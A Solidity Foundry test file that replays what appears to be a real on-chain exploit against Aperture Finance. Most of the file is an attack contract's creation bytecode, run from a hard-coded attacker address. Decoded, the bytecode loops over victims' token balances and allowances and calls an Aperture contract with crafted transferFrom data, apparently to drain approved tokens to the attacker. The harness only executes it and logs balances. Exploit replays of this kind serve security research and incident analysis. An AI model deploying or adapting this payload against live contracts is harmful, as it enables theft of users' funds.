// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./Aperture_FinanceBase.sol";

contract ReplayTest is Aperture_FinanceBase {
    address constant ATTACKER_ADDR = 0x6cAad74121bF602e71386505A4687f310e0D833e;
    address constant TARGET_ADDR = 0x0000000000000000000000000000000000000000;
    bytes constant INPUT_DATA = hex"608060405234801561001057600080fd5b5060405161137238038061137283398101604081905261002f91610af3565b61003a838383610042565b505050610deb565b736caad74121bf602e71386505a4687f310e0d833e7f87fde68cc1888edfe81dc1506b659b7eaf686fdb5848104f6a3d7679db4f8a5d32821461008457600080fd5b604080513260601b6001600160601b031916602080830191909152825160148184030181526034909201909252805191012081146100c157600080fd5b60005b845181101561084e5760008482815181106100e1576100e1610b67565b6020026020010151905060008683815181106100ff576100ff610b67565b60209081029190910101516040516370a0823160e01b81526001600160a01b0384811660048301529192506000918316906370a0823190602401602060405180830381865afa158015610156573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061017a9190610b7d565b604051636eb1769f60e11b81526001600160a01b0385811660048301528b8116602483015291925060009184169063dd62ed3e90604401602060405180830381865afa1580156101ce573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101f29190610b7d565b905081808210156102005750805b80600003610212575050505050610846565b60408051600280825260608201909252600091816020015b610257604051806060016040528060006001600160a01b0316815260200160008152602001600081525090565b81526020019060019003908161022a5790505090504660010361032957604051806060016040528073f34960d9d60be18cc1d5afc1a6f012a723a288116001600160a01b03168152602001600081526020016000815250816000815181106102c1576102c1610b67565b6020026020010181905250604051806060016040528073f34960d9d60be18cc1d5afc1a6f012a723a288116001600160a01b031681526020016000815260200160018152508160018151811061031957610319610b67565b60200260200101819052506105e3565b466038036103d657604051806060016040528073352cb5e19b12fc216548a2677bd0fce83bae434b6001600160a01b031681526020016000815260200160008152508160008151811061037e5761037e610b67565b6020026020010181905250604051806060016040528073352cb5e19b12fc216548a2677bd0fce83bae434b6001600160a01b031681526020016000815260200160018152508160018151811061031957610319610b67565b466121050361048457604051806060016040528073c5fecc3a29fb57b5024eec8a2239d4621e111cbe6001600160a01b031681526020016000815260200160008152508160008151811061042c5761042c610b67565b6020026020010181905250604051806060016040528073c5fecc3a29fb57b5024eec8a2239d4621e111cbe6001600160a01b031681526020016000815260200160018152508160018151811061031957610319610b67565b4661a4b1036105325760405180606001604052807313ad51ed4f1b7e9dc168d8a00cb3f4ddd85efa606001600160a01b03168152602001600081526020016000815250816000815181106104da576104da610b67565b602002602001018190525060405180606001604052807313ad51ed4f1b7e9dc168d8a00cb3f4ddd85efa606001600160a01b031681526020016000815260200160018152508160018151811061031957610319610b67565b604051806060016040528073f34960d9d60be18cc1d5afc1a6f012a723a288116001600160a01b031681526020016000815260200160008152508160008151811061057f5761057f610b67565b6020026020010181905250604051806060016040528073f34960d9d60be18cc1d5afc1a6f012a723a288116001600160a01b03168152602001600081526020016001815250816001815181106105d7576105d7610b67565b60200260200101819052505b60006105f0878b85610856565b60408051600180825281830190925291925060009190816020015b6106466040518060a00160405280600081526020016000815260200160006001600160a01b0316815260200160008152602001606081525090565b81526020019060019003908161060b5790505090506040518060a0016040528060008152602001600081526020018e8b8151811061068657610686610b67565b60200260200101516001600160a01b03168152602001601c815260200183815250816000815181106106ba576106ba610b67565b602002602001018190525060008e6001600160a01b0316638739554060e01b85846000806040516024016106f19493929190610c7b565b60408051601f198184030181529181526020820180516001600160e01b03166001600160e01b031990941693909317909252905161072f9190610d0d565b6000604051808303816000865af19150503d806000811461076c576040519150601f19603f3d011682016040523d82523d6000602084013e610771565b606091505b5050905061079e60405180604001604052806002815260200161414160f01b8152506108e760201b60201c565b6040516370a0823160e01b81526001600160a01b038d81166004830152600091908a16906370a0823190602401602060405180830381865afa1580156107e8573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061080c9190610b7d565b905061083b60405180604001604052806005815260200164424220257360d81b8152508261093160201b60201c565b505050505050505050505b6001016100c4565b505050505050565b60408051808201909152600481526323b872dd60e01b6020820152606090600061087f8661097e565b9050600061088c8661097e565b90506000856040516020016108a391815260200190565b6040516020818303038152906040529050838383836040516020016108cb9493929190610d29565b6040516020818303038152906040529450505050509392505050565b61092e816040516024016108fb9190610d80565b60408051601f198184030181529190526020810180516001600160e01b0390811663104c13eb60e21b179091526109e916565b50565b61097a8282604051602401610947929190610d9a565b60408051601f198184030181529190526020810180516001600160e01b03908116632d839cb360e21b179091526109e916565b5050565b604051606082811b6001600160601b03191660208301529060009060340160408051601f198184030181528282018252600c8352600060208481018290529251919450916109d0918491869101610dbc565b60408051601f1981840301815291905295945050505050565b61092e816109fc60201b61036f1760201c565b60006a636f6e736f6c652e6c6f679050600080835160208501845afa505050565b80516001600160a01b0381168114610a3457600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b600082601f830112610a6057600080fd5b815160206001600160401b0380831115610a7c57610a7c610a39565b8260051b604051601f19603f83011681018181108482111715610aa157610aa1610a39565b6040529384526020818701810194908101925087851115610ac157600080fd5b6020870191505b84821015610ae857610ad982610a1d565b83529183019190830190610ac8565b979650505050505050565b600080600060608486031215610b0857600080fd5b610b1184610a1d565b60208501519093506001600160401b0380821115610b2e57600080fd5b610b3a87838801610a4f565b93506040860151915080821115610b5057600080fd5b50610b5d86828701610a4f565b9150509250925092565b634e487b7160e01b600052603260045260246000fd5b600060208284031215610b8f57600080fd5b5051919050565b60005b83811015610bb1578181015183820152602001610b99565b50506000910152565b60008151808452610bd2816020860160208601610b96565b601f01601f19169290920160200192915050565b600082825180855260208086019550808260051b84010181860160005b84811015610c6e57858303601f1901895281518051845284810151858501526040808201516001600160a01b0316908501526060808201519085015260809081015160a091850182905290610c5a81860183610bba565b9a86019a9450505090830190600101610c03565b5090979650505050505050565b6080808252855190820181905260009060209060a0840190828901845b82811015610cd357815180516001600160a01b0316855285810151868601526040908101519085015260609093019290840190600101610c98565b5050508381036020850152610ce88188610be6565b92505050610cfb604083018560ff169052565b60ff8316606083015295945050505050565b60008251610d1f818460208701610b96565b9190910192915050565b60008551610d3b818460208a01610b96565b855190830190610d4f818360208a01610b96565b8551910190610d62818360208901610b96565b8451910190610d75818360208801610b96565b019695505050505050565b602081526000610d936020830184610bba565b9392505050565b604081526000610dad6040830185610bba565b90508260208301529392505050565b60008351610dce818460208801610b96565b835190830190610de2818360208801610b96565b01949350505050565b61057880610dfa6000396000f3fe6080604052600436106100435760003560e01c80637bba98521461004f578063c3bfce5f14610085578063c780d4d7146100a5578063e53b20171461010d57600080fd5b3661004a57005b600080fd5b34801561005b57600080fd5b5061006f61006a3660046103b6565b61012f565b60405161007c91906103fc565b60405180910390f35b34801561009157600080fd5b5061006f6100a036600461042f565b61019f565b3480156100b157600080fd5b506100ff6100c03660046103b6565b6040516bffffffffffffffffffffffff19606083901b166020820152600090603401604051602081830303815290604052805190602001209050919050565b60405190815260200161007c565b34801561011957600080fd5b5061012d6101283660046103b6565b610230565b005b604051606082811b6bffffffffffffffffffffffff191660208301529060009060340160408051601f198184030181528282018252600c83526000602084810182905292519194509161018691849186910161046b565b60408051601f1981840301815291905295945050505050565b60408051808201909152600481526323b872dd60e01b602082015260609060006101c88661012f565b905060006101d58661012f565b90506000856040516020016101ec91815260200190565b604051602081830303815290604052905083838383604051602001610214949392919061049a565b6040516020818303038152906040529450505050509392505050565b736caad74121bf602e71386505a4687f310e0d833e331461025057600080fd5b6001600160a01b03811661028e5760405133904780156108fc02916000818181858888f1935050505015801561028a573d6000803e3d6000fd5b5050565b6040516370a0823160e01b81523060048201526001600160a01b0382169063a9059cbb90339083906370a0823190602401602060405180830381865afa1580156102dc573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061030091906104f1565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561034b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061028a919061050a565b60006a636f6e736f6c652e6c6f679050600080835160208501845afa505050565b61039861052c565b565b80356001600160a01b03811681146103b157600080fd5b919050565b6000602082840312156103c857600080fd5b6103d18261039a565b9392505050565b60005b838110156103f35781810151838201526020016103db565b50506000910152565b602081526000825180602084015261041b8160408501602087016103d8565b601f01601f19169190910160400192915050565b60008060006060848603121561044457600080fd5b61044d8461039a565b925061045b6020850161039a565b9150604084013590509250925092565b6000835161047d8184602088016103d8565b8351908301906104918183602088016103d8565b01949350505050565b600085516104ac818460208a016103d8565b8551908301906104c0818360208a016103d8565b85519101906104d38183602089016103d8565b84519101906104e68183602088016103d8565b019695505050505050565b60006020828403121561050357600080fd5b5051919050565b60006020828403121561051c57600080fd5b815180151581146103d157600080fd5b634e487b7160e01b600052605160045260246000fdfea2646970667358221220acf678b85346baeeb3b88cd16808c1dd15270f3a612cdaeb479099f7f23b20de64736f6c63430008190033000000000000000000000000616000e384ef1c2b52f5f3a88d57a3b64f23757e000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000001000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda029130000000000000000000000000000000000000000000000000000000000000001000000000000000000000000ba15e9b644685cb845af18a738abd40c6bcd78ed";

    function testReplay() public {
        beneficiary = ATTACKER_ADDR;
        if (fundingToken == address(0)) vm.deal(address(this), 0);
        _logTokenBalance(fundingToken, beneficiary, "[REPLAY] Before");
        
        uint256 gasBefore = gasleft();
        try this._executeReplay() {
            uint256 gasUsed = gasBefore - gasleft();
            (string memory symbol, uint256 balance, uint8 decimals) = _getTokenData(fundingToken, beneficiary);
            _logTokenBalance(fundingToken, beneficiary, "[REPLAY] After");
            _writeExecutionResult("REPLAY", gasUsed, balance, symbol, decimals);
        } catch Error(string memory reason) {
            uint256 gasUsed = gasBefore - gasleft();
            _writePartialResult("REPLAY_FAILED", reason, gasUsed);
            emit log_string(string(abi.encodePacked("[REPLAY] Reverted: ", reason)));
            revert(reason);
        } catch (bytes memory) {
            uint256 gasUsed = gasBefore - gasleft();
            _writePartialResult("REPLAY_FAILED", "Low-level revert", gasUsed);
            emit log_string("[REPLAY] Low-level revert");
            revert("Low-level revert");
        }
    }

    function _executeReplay() external {
        vm.startPrank(ATTACKER_ADDR);
        (bool success, bytes memory returnData) = TARGET_ADDR.call(INPUT_DATA);
        if (!success) {
            if (returnData.length > 0) {
                assembly {
                    revert(add(returnData, 32), mload(returnData))
                }
            }
            revert("Replay failed");
        }
        vm.stopPrank();
    }
}
